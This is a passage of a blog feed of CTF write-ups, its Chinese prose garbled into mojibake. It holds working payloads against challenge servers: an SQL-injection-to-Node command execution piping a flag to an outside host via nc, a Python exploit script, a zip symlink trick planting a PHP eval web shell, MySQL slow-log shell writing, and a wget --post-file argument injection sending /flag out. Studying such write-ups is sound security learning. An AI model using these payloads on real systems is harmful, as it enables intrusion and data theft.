style="color:#00a8c8">ON&lt;/span> &lt;span style="color:#111">CONFLICT&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">DO&lt;/span> &lt;span style="color:#00a8c8">NOTHING&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>‰∏ÄÊ†∑ÁöÑÊÄùË∑ØÔºåÂÖàÈó≠ÂêàÔºåÂú®ÊûÑÈÄ†Ê≠£Â∏∏ÁöÑjsËØ≠Âè•&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;quot;&amp;quot;','')/*%s*/returning(1)as&amp;quot;\\'/*&amp;quot;,(1)as&amp;quot;\\'*/-(a=`child_process`)/*&amp;quot;,(2)as&amp;quot;\\'*/-(b=`/readflag|nc 10.188.2.20 9999`)/*&amp;quot;,(3)as&amp;quot;\\'*/-console.log(process.mainModule.require(a).exec(b))]=1//&amp;quot;--&amp;quot;&amp;quot;
&lt;/code>&lt;/pre>&lt;p>ËøòÂæóÁªìÂêà‰∏Ä‰∏ãÂâçÈù¢ÈÇ£‰∏™16MÁöÑÊ∫¢Âá∫&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">65535&lt;/span>&lt;span style="color:#111">))&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">65535&lt;/span>&lt;span style="color:#111">))&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">65535&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ÊúÄÂêéÊòØÂÆåÊï¥ÁöÑexpÔºåÊù•Ëá™‰∫éorange‰Ω¨&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">random&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">randint&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#75715e"># payload = &amp;#34;union&amp;#34;&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;&amp;#39;,&amp;#39;&amp;#39;)/*&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">*/returning(1)as&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\\&lt;/span>&lt;span style="color:#d88200">&amp;#39;/*&amp;#34;,(1)as&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\\&lt;/span>&lt;span style="color:#d88200">&amp;#39;*/-(a=`child_process`)/*&amp;#34;,(2)as&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\\&lt;/span>&lt;span style="color:#d88200">&amp;#39;*/-(b=`/readflag|nc 10.188.2.20 9999`)/*&amp;#34;,(3)as&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\\&lt;/span>&lt;span style="color:#d88200">&amp;#39;*/-console.log(process.mainModule.require(a).exec(b))]=1//&amp;#34;--&amp;#34;&amp;#34;&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39; &amp;#39;&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">1024&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">1024&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">16&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">username&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">65535&lt;/span>&lt;span style="color:#111">))&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">65535&lt;/span>&lt;span style="color:#111">))&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">65535&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#d88200">&amp;#39;username&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">username&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;password&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;AAAAAA&amp;#39;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">print&lt;/span> &lt;span style="color:#d88200">&amp;#39;ok&amp;#39;&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://10.188.2.20:12345/reg&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">print&lt;/span> &lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">content&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Ê∑±ËÇ≤Ëøô‰∏™È¢ò‰∏çËøáÊòØÊääÁôΩÁõíÂÆ°ËÆ°Êç¢Êàê‰∫ÜÈªëÁõíÔºåÊÄùË∑Ø‰∏ÄÊ®°‰∏ÄÊ†∑ÔºåÂ∞±‰∏çÁªÜÂó¶‰∫Ü&lt;/p>
&lt;p>ÂèÇËÄÉwpÔºö&lt;a href="https://github.com/t3hp0rP/hitconDockerfile">hitconDockerfile&lt;/a>/&lt;a href="https://github.com/t3hp0rP/hitconDockerfile/tree/master/hitcon-ctf-2017">hitcon-ctf-2017&lt;/a>/&lt;a href="https://github.com/t3hp0rP/hitconDockerfile/tree/master/hitcon-ctf-2017/sql-so-hard">sql-so-hard&lt;/a>/ÔºàÊúâËøô‰ΩçÂ∏àÂÇÖËá™Âà∂ÁöÑdockerÂèØ‰ª•Ëá™Ë°åÂ§çÁé∞Ôºâ&lt;/p>
&lt;h2 id="zipzip">ZipZip&lt;/h2>
&lt;p>È°µÈù¢Ê∫êÁ†ÅÊèêÁ§∫ÔºöÂê¨ËØ¥ÂéãÁº©ÂåÖÊñá‰ª∂‰πüËÉΩgetshellÔºõÂéãÁº©ÂåÖÁöÑ‰∏Ä‰∏™Â∏∏ËÄÉÁÇπÊòØËΩØÈìæÊé•‰ªªÊÑèÊñá‰ª∂ËØªÂèñÔºå‰∏çËøáËÑëÂ≠êÂ§™Êú®‰∫ÜÊ≤°ÊÉ≥Âà∞Â¶Ç‰ΩïÂÜôshellËøõÂéªÔºåÁúã‰∫Üwp‰ª•ÂêéÊâçÊòéÁôΩ&lt;/p>
&lt;p>‰∏ä‰º†zip‰πãÂêéÂõûÊòæÁöÑË∑ØÂæÑÊòØ/tmp/uploadsÔºåÊòæÁÑ∂Êó†Ê≥ïÊ≠£Â∏∏ËÆøÈóÆÔºõËøôÈáåÂèØ‰ª•Âà©Áî®ËΩØÈìæÊé•Â∞ÜshellÂÜôÂÖ•/var/www/html&lt;/p>
&lt;p>È¶ñÂÖàÂàõÂª∫‰∏Ä‰∏™ÊåáÂêë/var/www/html/ÁõÆÂΩïÁöÑËΩØÈìæÊé•Âπ∂zipÂéãÁº©‰∏ä‰º†&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">ln -s /var/www/html/ l1
zip -ry l1.zip l1
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ÁÑ∂ÂêéÂª∫Á´ã‰∏Ä‰∏™ÂíåËΩØÈìæÊé•ÂêçÂ≠óÁõ∏ÂêåÁöÑÁõÆÂΩïÔºåÂú®ÈáåÈù¢ÂÜôshellÔºå‰πãÂêéÂ∞ÜËøô‰∏™ÂêåÂêçÁöÑÁõÆÂΩïÊï¥‰∏™zipÂéãÁº©‰∏ä‰º†&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#75715e"># ÂΩìÂâçÁõÆÂΩï/var/www/html/&lt;/span>
mkdir l1 &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#111">cd&lt;/span> l1
&lt;span style="color:#111">echo&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;lt;?php eval($_GET[&amp;#39;&lt;/span>wuhu&lt;span style="color:#d88200">&amp;#39;]);?&amp;gt;&amp;#39;&lt;/span> &amp;gt; shell.php
&lt;span style="color:#111">cd&lt;/span> ../ &lt;span style="color:#75715e"># ÁªßÁª≠ËΩ¨Âà∞/var/www/html/&lt;/span>
zip -r l2.zip ./*
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Âç≥ÂèØÂÜôÂÖ•shell&lt;/p>
&lt;h2 id="weblog">***WebLog&lt;/h2>
&lt;p>‰∏ÄÊâìÂºÄÂ∞±‰ºö‰∏ãËΩΩ‰∏Ä‰∏™logÊñá‰ª∂Ôºå‰ΩÜÊòØÊ≤°‰ªÄ‰πàÂÜÖÂÆπÔºå‰øÆÊîπgetÂèÇÊï∞‰∏∫&lt;code>/?logname=logs/info/info.2021-11-12.log&lt;/code>ÂèØ‰ª•ÂæóÂà∞ÁúüÊ≠£ÁöÑlogÔºåÂèØ‰ª•ÁúãÂà∞ÊòØjavaÔºåÊàëÁà¨‰∫Ü&lt;/p>
&lt;h2 id="easysql">easysql&lt;/h2>
&lt;blockquote>
&lt;p>long_query_time&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211114115940931.png" alt="image-20211114115940931">&lt;/p>
&lt;p>Â∏∏Áî®ÁöÑselect„ÄÅÂçïÂèåÂºïÂè∑„ÄÅÊã¨Âè∑„ÄÅÂàÜÂè∑„ÄÅset„ÄÅshow„ÄÅvariables„ÄÅÁ≠âÈÉΩÊ≤°ÊúâËøáÊª§ÔºåËØ≠Âè•Èó≠ÂêàÊñπÂºè‰∏∫Êã¨Âè∑ÔºåÁôæÂêçÂçï‰∏∫Êï∞ÊçÆÂ∫ìËÆ∞ÂΩïË°åÊï∞Ôºå‰ΩøÁî®&lt;code>1);{sqlinject}--+&lt;/code>ÂèØ‰ª•Èó≠ÂêàÊü•ËØ¢ËØ≠Âè•+Â†ÜÂè†Ê≥®ÂÖ•&lt;/p>
&lt;pre tabindex="0">&lt;code>show variables like '%slow_query_log%'; # Êü•ËØ¢ÊÖ¢Êó•ÂøóËÆ∞ÂΩïÊòØÂê¶ÂºÄÂêØ
setglobal slow_query_log=1; # ÂºÄÂêØÊÖ¢Êü•ËØ¢Êó•Âøó
setglobal slow_query_log_file='/var/www/html/helpyou2findflag.php' # ËÆæÁΩÆÊÖ¢Êü•ËØ¢Êó•Âøó‰ΩçÁΩÆ
&lt;/code>&lt;/pre>&lt;p>ÊÖ¢Êü•ËØ¢ÔºåÈ°æÂêçÊÄù‰πâÊó∂Èó¥ÈïøÁöÑÊü•ËØ¢ËÆ∞ÂΩï‰ºöË¢´ËÆ∞ÂΩï‰∏ãÊù•ÔºåÊàë‰ª¨Áõ¥Êé•Êäälong_query_timeÁöÑÈªòËÆ§ÂÄºÊîπÊéâÔºåÁÑ∂ÂêéÂÜôÂÖ•shell&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">);&lt;/span>&lt;span style="color:#111">setglobal&lt;/span> &lt;span style="color:#111">long_query_time&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#ae81ff">000001&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#75715e">--+
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">);&lt;/span>&lt;span style="color:#00a8c8">show&lt;/span> &lt;span style="color:#111">variables&lt;/span> &lt;span style="color:#00a8c8">like&lt;/span> &lt;span style="color:#d88200">&amp;#39;long_query_time&amp;#39;&lt;/span>&lt;span style="color:#111">l&lt;/span>&lt;span style="color:#75715e">--+
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">);&lt;/span>&lt;span style="color:#00a8c8">select&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;lt;?php $_REQUEST[a]($_REQUEST[b])?&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#75715e">--+
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ÊàñËÄÖÁî®benchmarkËøôÊ†∑ÁöÑÂáΩÊï∞Âª∂ÈïøÊâßË°åÊó∂Èó¥&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">);&lt;/span>&lt;span style="color:#00a8c8">set&lt;/span> &lt;span style="color:#00a8c8">GLOBAL&lt;/span> &lt;span style="color:#111">slow_query_log_file&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;/var/www/html/helpyou2findflag.php&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#00a8c8">set&lt;/span> &lt;span style="color:#00a8c8">GLOBAL&lt;/span> &lt;span style="color:#111">slow_query_log&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">on&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#00a8c8">set&lt;/span> &lt;span style="color:#00a8c8">GLOBAL&lt;/span> &lt;span style="color:#111">log_queries_not_using_indexes&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">on&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#00a8c8">select&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">x3c3f706870206576616c28245f504f53545b315d293b3f3e&lt;/span> &lt;span style="color:#00a8c8">from&lt;/span> &lt;span style="color:#111">mysql&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#111">db&lt;/span> &lt;span style="color:#00a8c8">where&lt;/span> &lt;span style="color:#111">BENCHMARK&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">5000000000&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">MD5&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">x5476556d&lt;/span>&lt;span style="color:#111">));&lt;/span>&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#ae81ff">23&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>flag‰Ωç‰∫é/home/rainbow/ssh.log&lt;/p>
&lt;hr>
&lt;p>ÊØîËµõËÉΩÊö¥Èú≤Âá∫ÊàëÂ§™Â§öÁü≠Êùø‰∫ÜÔºåÈóÆÈ¢òÊå∫Â§ßÁöÑ&lt;/p>
&lt;p>È¶ñÂÖàÊòØÂÆπÊòìÊâãÂøôËÑö‰π±ÔºåÁ¨¨‰∫åÊòØ‰ªñÂ¶àÁöÑË∑ü‰∏™ËÑëÁò´‰∏ÄÊ†∑ÊâæÂà∞ÂéüÈ¢òÈÉΩ‰∏ç‰ºöÂèòÈÄöÔºåÁ¨¨‰∏âÊòØÂ∞±‰ºöÁûébb‰∏ç‰ºöÂ≠¶javaÔºåÁ¨¨ÂõõÊòØÁº∫‰πèË∑üÈòüÂèãÁöÑÊ≤üÈÄö&lt;/p>
&lt;p>Â∞±Â∑Æ‰∏ÄÈ¢òÂ∞±ËøõÁ∫ø‰∏ã‰∫ÜÔºåËøô‰∏ÄÈ¢òÂ∞±ÊäòÂú®ÊàëËøôÈáåÔºåÁúüÊòØÊàëÂÖ®Ë¥£ÔºåÁúüÁöÑÂæàÂØπ‰∏çËµ∑Âè¶Â§ñÁöÑpwnÁà∑ÂíåÂØÜÁ†ÅÁà∑ÔºåÂ§™‰∏¢‰∫∫‰∫ÜÔºåÊàëÂÖàÁ£ï‰∏Ä‰∏™ÔºåÁÑ∂ÂêéÁªôËá™Â∑±‰∏§Êã≥&lt;/p>
&lt;p>Â§™‰ªñÂ¶àÂèØÊÉú‰∫ÜÔºåËçâ&lt;/p></description></item><item><title>ÈôáÂéüÊàòÁñ´CTF Wp</title><link>https://amiaaaz.github.io/2021/11/16/longyuanzhanyi-ctf-wp/</link><pubDate>Tue, 16 Nov 2021 14:24:03 +0800</pubDate><guid>https://amiaaaz.github.io/2021/11/16/longyuanzhanyi-ctf-wp/</guid><description>&lt;h2 id="checkin">CheckIN&lt;/h2>
&lt;p>ÊòØ‰∏™goÁöÑÊñá‰ª∂ÔºåÂèëÁé∞‰∫Ü/wgetË∑ØÁî±ÂèØ‰ª•ÊâßË°åwgetÂëΩ‰ª§ÔºåÊé•Êî∂ÁöÑÂèÇÊï∞ÂèØ‰ª•ÊòØ‰∏™Êï∞ÁªÑ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211116141624569.png" alt="image-20211116141624569">&lt;/p>
&lt;p>Âà©Áî®wgetÁöÑÂèÇÊï∞Â§ñÂ∏¶flag&lt;/p>
&lt;pre tabindex="0">&lt;code>/wget?argv=1&amp;amp;agrv=--post-file&amp;amp;argv=/flag&amp;amp;agrv=http://101.35.114.107:8426/
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211116142102694.png" alt="image-20211116142102694">&lt;/p>
&lt;h2 id="eaaasyphp">eaaasyphp&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Check&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">$str1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">$str2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Esle&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__wakeup&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">Check&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#111">$str1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Hint&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__wakeup&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">hint&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;no hint&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__destruct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">hint&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">hint&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;phpinfo&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">hint&lt;/span>&lt;span style="color:#111">)();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Bunny&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__toString&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">Check&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#111">$str2&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_REQUEST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;data&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">file_put_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">filename&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Error&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Error&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Welcome&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__invoke&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">Check&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#111">$str2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;Welcome&amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">username&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Bypass&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__destruct&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">Check&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#111">$str1&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">str4&lt;/span>&lt;span style="color:#111">)();&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Error&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Error&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;code&amp;#39;&lt;/span>&lt;span style="color:#111">]))&lt;/span> &lt;span style="color:#111">{&lt;/span>
